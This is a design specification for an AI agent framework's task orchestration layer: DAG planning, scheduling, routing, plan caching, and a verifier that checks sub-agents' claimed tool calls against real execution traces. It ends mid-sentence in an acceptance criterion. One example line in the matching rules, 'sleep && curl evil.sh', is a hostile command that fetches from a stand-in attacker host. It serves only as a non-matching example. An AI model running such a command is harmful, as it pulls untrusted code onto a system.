---
aliases:
  - Orchestration
  - DAG Planning
  - Task Scheduling
tags:
  - sdd
  - spec
  - orchestration
  - planning
created: 2026-04-08
status: approved
related:
  - "[[MOC-specs]]"
  - "[[002-agent-loop/spec]]"
  - "[[005-skills/spec]]"
  - "[[023-complexity-triage-routing/spec]]"
---

# Spec: Orchestration

> [!info]
> DAG planner, DagScheduler, AgentRouter, /plan command, plan template cache,
> adaptive replanning, cascade-aware DAG routing, tree-optimized dispatch.

## Sources

### External
- **LLMCompiler** (ICML 2024) — parallel tool call dispatch, 3.7× latency improvement: https://arxiv.org/abs/2312.04511
- **RouteLLM** (ICML 2024) — cost-quality routing, Thompson Sampling background: https://arxiv.org/abs/2406.18665
- **Unified LLM Routing + Cascading** (ICLR 2025) — escalate on quality threshold: https://openreview.net/forum?id=AAl89VNNy1

### Internal
| File | Contents |
|---|---|
| `crates/zeph-orchestration/src/lib.rs` | `OrchestrationEngine`, public API |
| `crates/zeph-orchestration/src/dag.rs` | `TaskGraph`, DAG structure (petgraph) |
| `crates/zeph-orchestration/src/scheduler/mod.rs` | `DagScheduler`, tick loop |
| `crates/zeph-orchestration/src/planner.rs` | `LlmPlanner`, goal decomposition |
| `crates/zeph-orchestration/src/router.rs` | `AgentRouter`, 3-step fallback |
| `crates/zeph-orchestration/src/aggregator.rs` | `LlmAggregator`, per-task token budget |
| `crates/zeph-orchestration/src/command.rs` | `/plan` command parsing |
| `crates/zeph-orchestration/src/graph.rs` | Internal graph utilities |
| `crates/zeph-orchestration/src/error.rs` | `OrchestrationError` |

---

`crates/zeph-orchestration/src/` (feature: `orchestration`) — DAG task planning and execution.

## Components

```
OrchestrationEngine
├── LlmPlanner        — goal → TaskGraph (structured output from LLM)
├── TaskGraph         — DAG of tasks with dependencies (petgraph)
├── DagScheduler      — tick-based executor, respects dependency edges
├── AgentRouter       — routes tasks to sub-agents (rule-based, 3-step fallback)
└── LlmAggregator     — merges sub-agent results, per-task token budget
```

## Planning Flow

1. User provides goal (via `/plan goal <text>` or natural language)
2. `LlmPlanner` decomposes goal into `Task` nodes via structured output (JSON schema)
3. `TaskGraph` built as directed acyclic graph — edges represent dependencies
4. `/plan confirm` required before execution begins (user approval gate)
5. `DagScheduler` ticks: ready tasks (all deps resolved) are dispatched in parallel
6. Results flow through `LlmAggregator` which merges with per-task token budget

## AgentRouter (3-Step Fallback)

1. Exact rule match: config-defined `router_rules` (task type → agent name)
2. Capability match: check registered sub-agents for capability overlap
3. Default: route to primary agent

## Task States

```
Pending → Queued → Running → Completed
                 → Failed → Retryable (max 3 retries)
                          → Aborted
```

- `/plan cancel <id>` transitions Running → Aborted
- `/plan retry <id>` transitions Failed → Pending

## `/plan` CLI Commands

| Command | Action |
|---|---|
| `/plan goal <text>` | Decompose goal into DAG |
| `/plan status` | Show current plan status |
| `/plan list` | List all tasks with states |
| `/plan confirm` | Approve and start execution |
| `/plan cancel [id]` | Cancel task or entire plan |
| `/plan resume` | Resume paused plan |
| `/plan retry <id>` | Retry failed task |

## TUI Integration

- `PlanView` widget toggled with `p` key
- Shows DAG visualization, task states, progress
- Running tasks show spinner (mandatory per TUI rules)

## LlmPlanner Multi-Model Design

`LlmPlanner` accepts any `LlmProvider` — the caller selects the provider at construction time based on `OrchestrationConfig::planner_provider`.

### Config

```toml
[orchestration]
planner_provider       = "quality"   # references [[llm.providers]] name; empty = primary provider fallback
orchestrator_provider  = "quality"   # provider for the orchestrator's own LLM calls (aggregation, routing decisions)
```

- `planner_provider: String` — provider name for goal decomposition. Empty string means "use the agent's primary provider".
- `orchestrator_provider: String` — provider name for `LlmAggregator` and `AgentRouter` LLM calls. Empty string means "use the agent's primary provider". If unset, defaults to `planner_provider`.
- `planner_model` has been removed (dead field, cleaned up pre-v1.0.0). Config migration `migrate_planner_model_to_provider()` rewrites any existing `planner_model` key with a warning to use `planner_provider` instead.

### Provider selection rule

Planning is a complex/expert task (goal decomposition requires reasoning about parallelism and dependencies) — route to a quality provider, not a fast/cheap one.

```
planner_provider      = "quality"  # correct: complex reasoning task
orchestrator_provider = "quality"  # aggregation and routing decisions benefit from quality reasoning
```

### Key Invariants

- User confirmation (`/plan confirm`) is required before any task execution — never auto-start
- `LlmAggregator` must enforce per-task token budget — runaway tasks must be truncated
- `TaskGraph` must be a true DAG — cycles are a hard error, not a warning
- `DagScheduler` is tick-based (not event-driven) — tick interval is configurable
- Sub-agent results are merged by `LlmAggregator`, not concatenated — aggregation is an LLM call
- `planner_provider` must resolve via the provider registry at runtime — never hardcode a model in `LlmPlanner`
- `orchestrator_provider` must resolve via the provider registry at runtime; fallback to `planner_provider`, then primary

---

## AdmissionGate

`AdmissionGate` (#3617) is a pre-planning filter that prevents low-quality, malformed, or
policy-violating goals from reaching `LlmPlanner`. It runs synchronously before any LLM
planning call.

### Purpose

Without an admission gate, `LlmPlanner` accepts any string as a goal and makes an
expensive LLM call to decompose it. Common failure modes:

1. Empty or trivially short goals produce degenerate plans
2. Goals that include PII or injection attempts bypass VIGIL because the planner input
   is not a tool call
3. Extremely long goals (>8 KB) can cause planning context overflow

### Checks Performed (in order)

| Check | Threshold | Error |
|-------|-----------|-------|
| Goal length (min) | < 10 characters → reject | `OrchestrationError::GoalTooShort` |
| Goal length (max) | > `max_goal_length` bytes → reject | `OrchestrationError::GoalTooLong` |
| PII detection | VIGIL regex scan on goal text → warn + redact | Logged; planning proceeds with redacted goal |
| Injection detection | `SecurityPatterns` scan → reject | `OrchestrationError::GoalInjectionDetected` |

### Config

```toml
[orchestration.admission]
enabled         = true    # default: enabled
max_goal_length = 8192    # bytes; 0 = no limit
pii_warn        = true    # log a warning when PII is detected in the goal
inject_reject   = true    # reject goals that trigger injection patterns
```

### Key Invariants

- `AdmissionGate::check()` runs BEFORE any LLM call — no planning cost is incurred for rejected goals
- PII detection warns and redacts; it does not reject (goal may be valid but contain PII)
- Injection detection rejects immediately; no planning cost is incurred
- `enabled = false` bypasses all checks; the raw goal is forwarded to `LlmPlanner` unchanged
- NEVER surface the rejection reason as an LLM response — surface it as a user-facing error message through the channel

---

## Plan Template Caching

`crates/zeph-orchestration/src/plan_cache.rs`. Issue #1856.

### Overview

`PlanCache` stores completed `TaskGraph` plans as reusable `PlanTemplate` skeletons in SQLite. On subsequent semantically similar goals, the cache returns the closest template and uses a lightweight LLM adaptation call instead of full goal decomposition, reducing planner cost.

### `PlanTemplate` Structure

Stripped of all runtime state (status, results, retry_count, assigned_agent, timestamps):

```
PlanTemplate {
    goal: String,              // normalized goal text (trim + collapse whitespace + lowercase)
    tasks: Vec<TemplateTask>,  // structural skeleton
}

TemplateTask {
    title, description, agent_hint, depends_on, failure_strategy, task_id
}
```

`task_id`: stable kebab-case slug generated from title + position for `depends_on` reconstruction.

### Cache Lookup

1. Normalize goal: trim + collapse whitespace + lowercase
2. BLAKE3 hash of normalized goal → dedup key for `INSERT OR REPLACE ON CONFLICT(goal_hash)`
3. Cosine similarity computed in-process (no Qdrant) between query embedding and stored template embeddings
4. Return closest template if `similarity >= similarity_threshold` (default 0.90)
5. Lightweight LLM adaptation call: adapts template to the specific goal without full decomposition
6. Any cache failure → graceful degradation to full `planner.plan()` — cache never blocks planning

### Eviction

Two-phase eviction:
1. TTL sweep: delete rows where `created_at < now - ttl_days * 86400`
2. LRU size cap: if `count > max_templates`, delete oldest by `last_used_at`

Stale embeddings: NULLed when embedding model changes (same pattern as `ResponseCache`).

### Config

```toml
[orchestration.plan_cache]
enabled = false           # opt-in
similarity_threshold = 0.90
ttl_days = 30
max_templates = 100
```

### Key Invariants

- Cache failure (DB error, embedding error) always falls back to `planner.plan()` — never surface cache errors to user
- Goal normalization (trim + collapse + lowercase) is mandatory for dedup — never hash un-normalized goal
- Cosine similarity uses in-process math — never depends on Qdrant being available
- `INSERT OR REPLACE ON CONFLICT(goal_hash)` prevents duplicate templates
- Adaptation call is always an LLM call — never return template directly without adaptation
- NEVER block plan execution on cache write — write is best-effort

---

## Inter-Agent Handoff

Inter-agent context propagation uses a skill-based YAML protocol defined in the `rust-agent-handoff` skill. See `specs/handoff-skill-system/spec.md` for the full specification.

There are no typed Rust structs or compile-time validation for handoff content in the orchestration crate. The skill documentation is the contract. Typed validation (PRs #2076, #2078) was attempted and reverted (#2082).

---

## Topology Classification

`TopologyClassifier` — heuristic DAG topology detection. Issues #1840, #2219.

### Topology Variants

| Topology | Description | Default strategy |
|---|---|---|
| `AllParallel` | All tasks independent | `FullParallel` |
| `LinearChain` | All tasks form a sequence | `Sequential` |
| `FanOut` | Single root → many leaves | `Adaptive` |
| `FanIn` | Many sources → single sink | `Adaptive` |
| `Hierarchical` | Multiple levels with partial ordering | `LevelBarrier` |
| `Mixed` | Other | `Adaptive` |

### TopologyAnalysis

`analyze()` returns `TopologyAnalysis { topology, strategy, max_parallel, depth, depths: HashMap<TaskId, usize> }`.

- `classify_with_depths(graph, longest_path, depths)` accepts pre-computed values to avoid redundant toposort
- `compute_max_parallel(topology, base)` is the single canonical source of topology→parallelism policy
- `DagScheduler` stores `config_max_parallel` (immutable) and re-derives `max_parallel` from topology on each analysis — prevents drift across replan cycles

### LevelBarrier Dispatch

For `Hierarchical` topology: tasks are grouped into levels (depth layers). `DagScheduler.tick()` dispatches all tasks at the current level, then waits for all to complete before advancing. `current_level` is reset after `inject_tasks()` inserts a task at depth < current level.

### Config

```toml
[orchestration]
topology_selection = false  # opt-in; default false (crates/zeph-config/src/experiment.rs)
```

### Key Invariants

- `compute_max_parallel()` must be called with the immutable `config_max_parallel` as base — never with runtime `self.max_parallel`
- `topology_dirty` flag defers re-analysis to the start of the next `tick()` — never re-analyze mid-tick
- After `self.topology = new_analysis`, `self.max_parallel` must be immediately synced
- `LevelBarrier` requires `current_level` reset when `inject_tasks()` inserts tasks below the current level
- NEVER re-derive max_parallel without syncing `self.max_parallel` — slot drift is a liveness bug

---

## Plan Verification

`PlanVerifier<P>` — LLM-based completeness check after task completion. Issue #2202.

### Verification Flow

After the last task in a plan completes, `PlanVerifier.verify()` is called:
1. Returns `VerificationResult { complete, gaps: Vec<Gap>, confidence }`
2. `Gap { description, severity: GapSeverity, suggested_task }`
3. `GapSeverity`: `Critical`, `Important`, `Minor`
4. If `complete = false` and non-minor gaps exist: `replan()` is called to inject new tasks
5. `inject_tasks()` validates acyclicity and marks newly ready tasks

### Replan Constraints

- `max_tasks` cap: replan respects global task limit
- Minor-only gaps: `replan()` is skipped — minor gaps don't justify extra LLM calls
- `max_replans` per-task cap: second `inject_tasks()` call for the same task is a silent no-op
- Global `max_replans`: enforced across the whole scheduler — prevents infinite verify→replan loops
- `replan_prompt` gap descriptions truncated to 500 chars to limit injection blast radius

### Fail-Open Behavior

LLM error during `verify()` → treated as `complete = true` (fail-open). Consecutive failure tracking: `ERROR` log emitted at ≥ 3 consecutive failures.

### Config

```toml
[orchestration]
verify_completeness = true
verify_provider = "quality"           # must exist in [[llm.providers]]
completeness_threshold = 0.7          # confidence threshold for "complete" verdict [0.0, 1.0]
max_replans_remaining = 3             # global per-plan replan budget (VMAO)
```

`verify_provider` is validated at `DagScheduler` construction. Empty string = fallback to primary. Unknown provider name = `Err(InvalidConfig)` (hard fail).

`completeness_threshold` (default 0.7): when the verifier's `confidence` field is below this value, the plan is treated as incomplete even if `complete = true`. This handles uncertain LLM verdicts.

`max_replans_remaining` is initialized per plan and decremented on each successful replan. When it reaches zero, no further replanning occurs regardless of gap severity.

### VMAO: Verify-and-Modify Adaptive Orchestration

VMAO (Verify-and-Modify Adaptive Orchestration) extends Plan Verification with adaptive replanning:

1. **`verify_plan()`** — called after each task completes (not only at plan end)
   - Returns `VerificationResult` with `complete`, `gaps`, `confidence`
   - When `confidence < completeness_threshold` AND incomplete → trigger replan
   - When `confidence >= completeness_threshold` AND complete → skip replan
2. **`replan_from_plan()`** — injects new tasks from gap descriptions into the existing DAG
   - Respects `max_replans_remaining` per plan
   - New tasks are injected via `inject_tasks()` with acyclicity validation
   - Replan prompt gap descriptions truncated to 500 chars (blast radius limit)

`DagScheduler` gains:
- `completeness_threshold: f64` — configurable confidence threshold
- `verify_provider_name: Option<String>` — provider for verification calls
- `max_replans_remaining: u32` — mutable countdown, decremented per replan

### Key Invariants

- Fail-open on LLM error — never block task completion on verifier failure
- Minor-only gaps never trigger replan
- `inject_tasks()` must validate acyclicity — never add a cycle to the DAG
- Gap descriptions are sanitized via `ContentSanitizer` before prompt embedding
- `verify_provider` must be validated at construction, not at verify time
- NEVER emit `SchedulerAction::Verify` when `verify_completeness = false`
- `max_replans_remaining = 0` means no replanning; do not decrement below zero
- `completeness_threshold` must be in `[0.0, 1.0]` — values outside are a config error
- `verify_plan()` and `replan_from_plan()` are called per-task, not only at plan end (VMAO)
- NEVER block task dispatch while verification is in progress — verification is async
- `verify()` MUST deserialize the LLM verify response into a dedicated `VerifyResponse` DTO and run the deterministic `ground()` stage before projecting `{complete, gaps, confidence}` into `VerificationResult` — see [[#Verifier Tool-Call Grounding]]
- An unmatched entry in `claimed_executions` on an **available** `tool_trace` MUST force `complete = false` with a `Critical` gap, regardless of the LLM's own verdict — NEVER let `complete = true` override a deterministic grounding mismatch
- Grounding MUST fail open (skip the override, pass the LLM's verdict through unmodified) when `tool_trace` is unavailable (`None`); an available-but-empty trace is not itself a gap — only an unmatched claim is. This is a narrower, grounding-specific fail-open, distinct from the whole-`verify()` fail-open on LLM error/timeout above
- `ground()` MUST be pure — no I/O, no second LLM call, no randomness — and MUST NOT be implemented as a regex/substring scan of the raw narration; the claim set comes only from the LLM's structured `claimed_executions`
- Grounding on the ensemble path MUST run as one `ground()` call over the **union** of `claimed_executions` across all responded members, after `merge()` — never inside `merge()`, never majority/intersection
- `verify_plan()` MUST run the same deterministic `ground()` stage over the **DAG-wide union** of every completed task's `tool_trace`; the aggregate MUST be `None` (fail open) if **any** completed-with-result task's trace is unavailable — never `Some(partial_union)`, which could false-positive an honest claim — see [[#Whole-Plan Grounding (issue #6287)]]

### User-Visible Incompleteness Signal (issue #6265)

Prior to #6265, a verifier judging output incomplete with no successful automatic repair was
silent to the user — only `tracing::debug!`/`tracing::warn!` recorded it, and
`finalize_plan_execution` only branches user-visible messaging on `GraphStatus`
(`Completed`/`Failed`/`Paused`/`Canceled`), which reflects task *execution* outcome, not the
verifier's *completeness* judgment. A plan whose only task technically completed (produced some
output) was reported as an unqualified success even when verification confidently judged that
output wrong.

Both verification scopes now emit an independent, fail-open `channel.send(...)` notice whenever
`result.complete == false` and no repair resolves the gap:

- **Whole-plan** (`run_whole_plan_verify`, `agent/plan.rs`): `signal_plan_incomplete()` sends
  `"Note: the plan output may be incomplete — verification found {N} unresolved gap(s)
  (verification confidence {C}%) and automatic repair did not resolve it."` — fired when
  `should_replan` is false but `!result.complete` (confidently incomplete or no actionable gaps),
  when `replan_from_plan()` errors, when it returns no gap tasks, or when
  `execute_partial_replan_dag()` returns `None` (replan ran but produced nothing usable).
- **Per-task** (`scheduler_loop.rs`, ensemble/verify branch): a task-scoped notice —
  `"Note: task \"{title}\" verification found {N} unresolved gap(s) (verification confidence
  {C}%)."` — fired when `!result.complete && !repaired`, worded local to the task since a later
  whole-plan replan may still self-heal the gap.

**Key invariants (additive to the list above):**

- `result.complete == true` never emits a signal — nothing to report, no replan is attempted.
- The signal is best-effort: a `channel.send` failure is logged via `tracing::warn!` and never
  propagated as a turn error — this is a notice, not a control-flow gate.
- The signal is emitted at most once per verification outcome (whole-plan: at the single
  `return None` point reached for that verdict; per-task: once per task's verify branch) — never
  duplicated across the fail-open retry paths within the same verification call.
- This is purely a user-visibility addition — it changes no `VerificationResult`/`GraphStatus`
  shape, no replan gating, and no grounding behavior; `should_replan`'s computation (§ above) is
  unmodified.

---

## Verifier Tool-Call Grounding

`PlanVerifier::verify()` cross-checks the sub-agent's narrated completion against the real
tool-call execution trace before accepting the verify-provider's verdict. Issue #6278: a cheap
`verify_provider` could rate a purely narrated completion (e.g. "I ran `cargo test` and it
passed", with no real `ToolUse`/`ToolResult` evidence behind it) as `complete: true`, silently
accepting a hallucinated task completion.

### Architecture

Grounding splits the check into a fuzzy extraction stage (LLM) and an authoritative
deterministic stage (pure Rust) layered on top of the existing verify flow:

1. **Extraction (LLM).** The verify-provider response deserializes into a dedicated
   `VerifyResponse` DTO — not `VerificationResult` directly — mirroring the existing
   `ReplanResponse` precedent:
   ```
   VerifyResponse {
       complete: bool,
       gaps: Vec<Gap>,
       confidence: f64,
       claimed_executions: Vec<String>,   // #[serde(default)] — see Missing/Malformed below
   }
   ```
   `claimed_executions` lists the tool/command invocations the narrated `output` claims
   occurred, in a normalized `"<tool>: <command>"` convention. A bare entry with no `: `
   separator is accepted and matched against any trace entry regardless of tool — coarser, but
   fail-safe toward detection. Extraction is performed entirely by the LLM — never by a regex
   scan of the narration.
2. **Grounding (deterministic).** A pure function
   `ground(complete, gaps, claimed_executions, tool_trace) -> (complete, gaps)` cross-checks
   every claimed execution against the real trace and overrides the LLM's verdict when a claim
   has no match. `ground()` performs no I/O, no second LLM call, and no randomness —
   unit-testable in isolation (mirrors spec 073's `merge()` purity).
3. **Projection.** `verify()` projects the grounded `{complete, gaps, confidence}` into the
   existing `VerificationResult`. `claimed_executions` never enters `VerificationResult` —
   073's "no new field" invariant is preserved. The grounding `Gap` (`severity: Critical`) flows
   through the existing `should_replan` gate and `replan()` pipeline unchanged; `TaskNode.status`
   stays `Completed` — verification remains observational, not gating.

### `ToolCallSummary` and Trace Availability

```
ToolCallSummary {
    tool: String,
    args_summary: Option<String>,   // None ⇒ args not captured; treated as inconclusive, see Matching Rule
    ok: bool,                       // execution outcome; NOT used by matching, see Scope below
}
```

The grounding input is `Option<&[ToolCallSummary]>` — tri-state, not a bare slice:

| Value | Meaning | Effect |
|---|---|---|
| `None` | trace unavailable — transcript missing, unreadable, or a partial/deserialize-error read | grounding is skipped entirely; the LLM's own `{complete, gaps}` passes through unmodified (fail-open on grounding specifically) |
| `Some(&[])` | trace present, genuinely empty (no tools ran) | claims are checked normally; an unmatched claim is a real `Critical` gap |
| `Some(&[…])` | trace present, non-empty | normal matching (see Matching Rule) |

The trace-read helper MUST fail closed to `None` — never a bogus `Some(&[])` — on any lookup
miss, **including transcript deserialization errors and partial reads**: a lenient
line-skipping reader that silently drops a `ToolUse` entry on a partial read would
false-positive an honest claim. This is a code-level precondition at the read site, not spec
prose alone.

**Residency note (spawn path) — resolved (issue #6288).** The spawn-path trace read no longer
depends on the sub-agent's handle remaining resident in `SubAgentManager`.
`SubAgentManager::collect()` **is** wired into the orchestration dispatch path (`Agent::
collect_finished_subagents()`, called once per scheduler tick in `run_scheduler_loop`), and the
grounding read is unaffected by its timing: `SubAgentManager::transcript_path_for()` resolves the
transcript path purely from `SubAgentConfig` and `agent_id`, with no dependency on
`self.agents` — unlike the residency-coupled `agent_transcript_dir()` accessor it replaced. The
read still MUST fail-closed to `None` on any lookup miss (missing `agent_id`, missing
`SubAgentManager`, or a transcript read error), independent of collection timing.

### Implementation Surface

`PlanVerifier::verify()` gains `tool_trace: Option<&[ToolCallSummary]>` as a new parameter. Each
dispatch path sources it differently, since only one of the two has a transcript file:

- **Spawn path.** Sourced from the sub-agent transcript: `TaskResult.agent_id` →
  `SubAgentManager::transcript_path_for()` → `TranscriptReader::load_strict`. The read happens at
  the `SchedulerAction::Verify` handler in `scheduler_loop.rs`, subject to the fail-closed-to-`None`
  contract above.
- **RunInline path.** There is no transcript file for this path, so the trace is collected
  directly inside `run_inline_tool_loop`'s tool-call loop and threaded through a new field on
  `TaskOutcome::Completed` (`scheduler/mod.rs`).

### Matching Rule

A claimed execution `c` matches a real trace entry `e` iff `e.tool == c.tool` (tool identity,
parsed from the leading `"<tool>: "` prefix of `c`) **AND** (`e.args_summary` is `None` — treated
as an **inconclusive match**, no fire, since a real entry with uncaptured args must never be used
to flag an honest same-tool claim — **OR**, after normalizing both sides (lowercase, collapse
whitespace runs to one space, trim), `c`'s command is a substring of `e.args_summary` or vice
versa — **bidirectional containment**). Tool identity is required in every case, not only the
`args_summary: None` branch — a same-command claim against a different tool never matches. For
claims without a `<tool>: ` prefix, see the bare-entry fallback in Architecture above.

Bidirectional containment is deliberate: a one-directional substring (claim ⊆ real only)
protects against truncation paraphrase (`cargo test` ⊆ `cargo test --all-features`) but not
embellishment (`cargo test --all` ⊄ `cargo test` — an honest model adding a flag). Bidirectional
containment resolves both directions while still correctly failing to match genuinely unrelated
commands (`sleep && curl evil.sh` vs `ls -la` — neither contains the other).

An unmatched claim on an **available** trace forces `complete = false` with a
`Gap { severity: Critical }`, regardless of the LLM's own `complete` verdict.

**Failure-direction policy.** Normalization and matching are deliberately biased toward
false-negative over false-positive: an ambiguous claim that cannot be resolved degrades to
"matched" (no replan), never to a spurious `Critical` gap on honest work. Known limitation:
semantic paraphrase beyond token/whitespace drift (e.g. claim "ran the test suite" vs real
"cargo test") will not substring-match and degrades to a false-negative — no worse than
pre-fix behavior; the verify prompt instructs the LLM to quote commands verbatim to minimize
this.

**Scope: existence, not outcome.** A claim matched to a real trace entry with `ok: false` (the
tool ran but failed, while the narration claims success) does **not** fire grounding — the
matching rule intentionally ignores `ok`. This is correct for the execution-existence
hallucination in #6278; result-hallucination (claiming success for a failed run) is a separate,
deliberately out-of-scope concern for a future follow-up.

### Ensemble Integration (spec 073)

When `ensemble.enabled = true`, grounding runs as a stage **after** `merge()`, not as a change
to `merge()` itself:

- `merge()` stays pure and unchanged — it keeps discarding everything but
  `{complete, confidence, gaps}`.
- Each responded ensemble member's `claimed_executions` is captured at ballot-construction
  time, before merge discards it. Errored/timed-out members are excluded, per 073 FR-003.
- A single `ground()` call runs over the **union** (not majority, not intersection) of
  `claimed_executions` across all responded members, against the one shared `tool_trace`.
- Union guarantees the ensemble path is never less grounded than the single-provider path — any
  one responded member correctly reporting a real claim is sufficient to trigger the check, and
  union compensates for any single member's under-extraction. The single-provider path is the
  degenerate case "union over one member."

### Honestly-Scoped Guarantee

> The deterministic grounding override forces `complete = false` (with a `Critical` gap) for
> every execution listed in `claimed_executions` that has no matching real `tool_trace` entry,
> regardless of the verify-provider LLM's own `complete` verdict. The override binds the
> *verdict*, not the *detection*: claim extraction is performed by the same (possibly cheap)
> model that may under-report, so grounding's guarantee is conditional on the LLM self-reporting
> the executions it narrated. Where extraction is complete, the accept decision is authoritative;
> where the LLM under-reports, grounding degrades to pre-fix behavior for that task — never
> worse.

### Observability

- **Override metric + log.** Every time `ground()` flips `complete` from `true` to `false`,
  emit a counter increment and an INFO/WARN log with `task_id`, the unmatched claim, and
  matched/total claim counts — making real catches countable.
- **Soft extraction-degradation counter.** A separate counter increments when the narrated
  `output` is execution-narrative-heavy (an output-length threshold combined with zero returned
  claims) yet `claimed_executions` came back empty. This is a soft trend signal only — it has
  zero effect on the verdict and MUST NOT become a decision input; it does not reintroduce a
  narration regex.

### Missing / Malformed `claimed_executions`

- **Missing or `null`** ⇒ `#[serde(default)]` yields an empty `Vec`; grounding no-ops for that
  task (same as today's ungrounded behavior), and a `WARN` log records `task_id` +
  "verify response omitted claimed_executions; grounding skipped for this task". This is
  deliberately safer than a hard-required field, which would instead deserialize-fail the whole
  `VerifyResponse` and route through `fail_open()` (`complete: true`) — silently accepting the
  exact hallucination this feature targets.
- **Wrong-typed** (e.g. the LLM returns a string instead of an array) is a distinct case:
  `serde(default)` only fires on absent/null, so a type-mismatched field still fails
  `VerifyResponse` deserialization and falls through to the existing top-level `fail_open()`
  contract — i.e. today's pre-fix behavior (`complete: true`), no worse than before but not
  specially rescued by this feature.

### Whole-Plan Grounding (issue #6287)

`verify_plan()` grounds its aggregated-output verdict against the **union** of every completed
task's real `tool_trace`, applying the identical deterministic `ground()` stage the per-task
path uses. This is independent defense-in-depth: per-task `verify()` already grounds each task's
own narration against its own trace, so today's whole-plan grounding is *additive*, not the sole
guard. Its purpose is to close the structural gap that a future dispatch mode which lets a task
reach whole-plan aggregation *without* a prior grounded per-task `Verify` would otherwise open —
laundering a hallucinated claim that only surfaces once outputs are aggregated across the DAG.

**Aggregation is transcript-derived, not per-task-verify-derived.** At `run_whole_plan_verify`
time the DAG-wide trace is rebuilt from source, per completed-with-result task, by reimplementing
the same resolution logic `build_tool_trace_for_task` uses for the per-task path (`TaskResult.agent_id`
→ `SubAgentManager::transcript_path_for()` → `TranscriptReader::load_strict`) — split across
`resolve_whole_plan_trace_paths` (synchronous path resolution) and `build_whole_plan_tool_trace`
(the actual reads, offloaded to `spawn_blocking`). `build_tool_trace_for_task` itself is
module-private to `scheduler_loop.rs` and is not called directly from the whole-plan path (a
sibling module); only its inner `tool_trace_from_messages` conversion (messages →
`Vec<ToolCallSummary>`) is actually shared, bumped to `pub(super)` for that purpose. Rebuilding
from the transcript — rather than reusing a value cached during per-task `Verify` — is deliberate:
it makes whole-plan grounding correct *even when per-task `Verify` was skipped* for some task,
which is exactly the future gap this closes. The reads are already-persisted transcripts; no
per-task LLM claim-extraction is re-run.

**Residency note (whole-plan path) — resolved (issue #6288).** `run_whole_plan_verify` runs
strictly after `run_scheduler_loop` returns (`plan.rs`), i.e. after every per-tick
`collect_finished_subagents()` call for the just-completed plan has already run — every
spawn-dispatched completed task's handle is reaped from `SubAgentManager` by the time this path
resolves transcript paths. Like the per-task path above, `resolve_whole_plan_trace_paths` uses
`transcript_path_for()` (not `agent_transcript_dir()`), so it does not depend on handle residency
and is unaffected by that ordering.

**Trace availability is all-or-nothing, lifted to the DAG level.** The aggregate is
`Some(union)` only if **every** completed-with-result task resolves to `Some(trace)`; if **any**
one resolves to `None` (unavailable — unreadable/partial transcript, or a RunInline task whose
in-loop trace is ephemeral and has no transcript file), the whole aggregate degrades to `None`
and grounding is skipped entirely (fail-open), exactly reproducing today's ungrounded behavior.
This mirrors the per-task `None`-means-unavailable contract: a union missing part of the real
execution record could false-positive an honest claim, so an incomplete union must never drive an
override. Consequence and documented limitation: a DAG containing any RunInline task fails open at
whole-plan grounding (RunInline traces are not persisted); persisting them onto `TaskResult` to
cover that case is a deliberate future enhancement, not part of this MVP. Under the default
`RuleBasedRouter`, a DAG is either all-spawn or all-inline (it returns `None` — i.e. RunInline —
iff `available_agents` is empty, otherwise every task routes to a sub-agent), so in practice this
limitation manifests as an all-or-nothing feature toggle per deployment: a no-subagent-defs
deployment gets zero whole-plan grounding, silently, unless the caller logs the degradation (see
`run_whole_plan_verify`'s DEBUG log on aggregate unavailability). A **custom** `AgentRouter`
implementation, however, can freely mix spawn and RunInline dispatch within a single DAG — in that
case a single stray inline task disables whole-plan grounding for the *entire* plan, even though
every other task's transcript is perfectly readable. This is a real, not merely theoretical,
failure mode for any deployment using a router other than the default.

**Union, not per-task attribution — and materially weaker detection than the per-task path.**
`ground()` checks each aggregated `claimed_executions` entry against *any* union member. Grounding
against the union (rather than the originating task's trace) is strictly more lenient — a claim
grounds if it matches any task's real call — which is the correct fail-open bias; task-boundary
attribution is intentionally not reconstructed from the concatenated output. This leniency has a
real cost: a per-task hallucination (task T's own narration claims a command T never ran) PASSES
whole-plan grounding if **any other task U** in the same DAG genuinely ran that command, even
though per-task `verify()` on T alone would have caught it. Because the sole reason this feature
exists is to defend against a *future dispatch mode that skips per-task `Verify`* — in which
whole-plan grounding becomes the **only** guard for that task — this is exactly the scenario where
whole-plan grounding runs at its *weakest*. Whole-plan grounding is therefore genuine
defense-in-depth only, layered on top of (never a replacement for) per-task grounding; it is not
sized to catch every hallucination on its own, only to close the specific structural gap described
above.

**Prompt bound vs. grounding input.** The full union is passed to the deterministic `ground()`
call (which alone binds the verdict). The advisory tool-trace section rendered into the
`verify_plan` prompt is capped at a fixed entry count to keep the prompt bounded on large DAGs;
because `ground()` runs in Rust over the complete slice, capping the *prompt* rendering can never
introduce a false-positive (unlike dropping entries from the grounding input, which is forbidden).
`aggregated_output` remains pre-truncated by the caller as today.

**Scope alignment.** Only `Completed` tasks with a `result` contribute both output and trace, so
partial/failed tasks are excluded symmetrically from both sides. Output truncation only *removes*
claims (never adds), and a union that is a superset of the referenced calls is always safe, so
truncation cannot desync the two sides. Whole-plan verify is single-provider `PlanVerifier` only
(the ensemble path is per-task); no ensemble union is constructed here.

`replan_from_plan()` needs no change: it consumes the grounded `gaps` that `verify_plan()` now
emits, so a grounding-forced `Critical` gap flows through the existing `should_replan` gate into
whole-plan replan unchanged. As with the per-task path, `TaskNode.status` stays `Completed` —
grounding remains observational, adding replan tasks, never gating acceptance.

**Note (execution contract, not part of the grounding contract itself):** `execute_partial_replan_dag`
runs `replan_from_plan()`'s gap tasks in a standalone `DagScheduler`/`TaskGraph`, which
`dag::validate` requires to carry 0-based positional task IDs (`tasks[i].id == TaskId(i)`) — but
`replan_from_plan()` assigns gap-task IDs continuing the *parent* graph's numbering so the final
merge into `completed_graph.tasks` stays globally unique. `execute_partial_replan_dag` reconciles
this by remapping gap-task IDs to local 0-based IDs for the partial scheduler run and back to the
original global IDs on the way out (fixed alongside #6287's end-to-end wiring test, which was the
first test to exercise this path with a non-empty parent graph and exposed a pre-existing
rejection here — see CHANGELOG).

### Config

No new configuration surface. Grounding is always-on whenever `verify_completeness = true` — no
separate opt-in flag, no config/migration/wizard entries required.

### Acceptance Criteria

- **AC-1 (core #6278 regression):** narrated `output`, `tool_trace = Some(&[])` (empty,
  available), LLM returns `{complete:true, claimed_executions:["bash: cargo test"], gaps:[]}` ⇒
  final `VerificationResult { complete:false }` with a `Critical` gap.
- **AC-2 (no false-positive, tool-free task):** tool-free `output`, `tool_trace = Some(&[])`,
  LLM returns `{complete:true, claimed_executions:[]}` ⇒ `complete:true`, no grounding gap.
- **AC-3 (honest completion, truncation paraphrase):** claim `"bash: cargo test"` vs a real
